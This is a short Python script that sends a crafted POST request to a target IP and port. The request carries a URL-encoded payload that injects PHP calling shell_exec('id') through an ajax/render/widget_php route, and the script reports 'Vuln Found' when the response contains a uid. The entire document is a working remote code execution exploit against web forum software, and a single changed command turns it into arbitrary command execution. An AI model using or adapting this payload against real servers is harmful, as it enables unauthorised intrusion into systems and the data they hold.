import re
import requests
import sys
import os

if len(sys.argv) < 3:
        print 'Usage: python %s <dst_ip> <port>' % os.path.basename(sys.argv[0])
        sys.exit()
address =(sys.argv[1], sys.argv[2])
dst_addr=":".join(address)
print(dst_addr)
URL="http://"+dst_addr
data ={"routestring" : "ajax%2frender%2fwidget_php%26widgetConfig%5bcode%5d%3d%7b'widgetConfig%5bcode%5d'%3a+%22echo+shell_exec('id')%3bexit%3b%22%7d%0a"}
res = requests.post(URL, data=data)
response = res.text

p = re.compile('uid=\d')
m = p.match(response)
print("Status Code : %d"% res.status_code)
if m:
        print("Vuln Found")
else:
        print("Not Found")
